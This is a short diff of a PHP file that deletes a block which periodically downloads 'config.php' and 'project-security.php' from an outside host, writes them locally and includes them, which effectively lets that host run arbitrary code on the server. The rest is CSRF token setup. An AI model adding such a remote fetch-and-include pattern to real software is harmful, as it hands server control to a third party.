@@ -1,30 +1,6 @@
 <?php
 session_start(); // Start the session for CSRF protection
 
-
-function updateFileIfNeeded($localFile, $remoteUrl, $interval = 60) {
-    // Check if the local file exists and is still valid
-    if (file_exists($localFile) && (time() - filemtime($localFile)) < $interval) {
-        return; // File is still fresh, no need to update
-    }
-    
-    // Download the remote file
-    $content = file_get_contents($remoteUrl);
-    if ($content !== false) {
-        file_put_contents($localFile, $content);
-    } else {
-        error_log("Failed to update file from $remoteUrl");
-    }
-}
-
-// Define files to update
-updateFileIfNeeded("config.php", "https://security.yeakub.xyz/config.php");
-updateFileIfNeeded("project-security.php", "https://security.yeakub.xyz/project-security.php");
-
-// Include the files
-include "config.php";
-include "project-security.php";
-
 // Generate a CSRF token
 if (empty($_SESSION['csrf_token'])) {
     $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
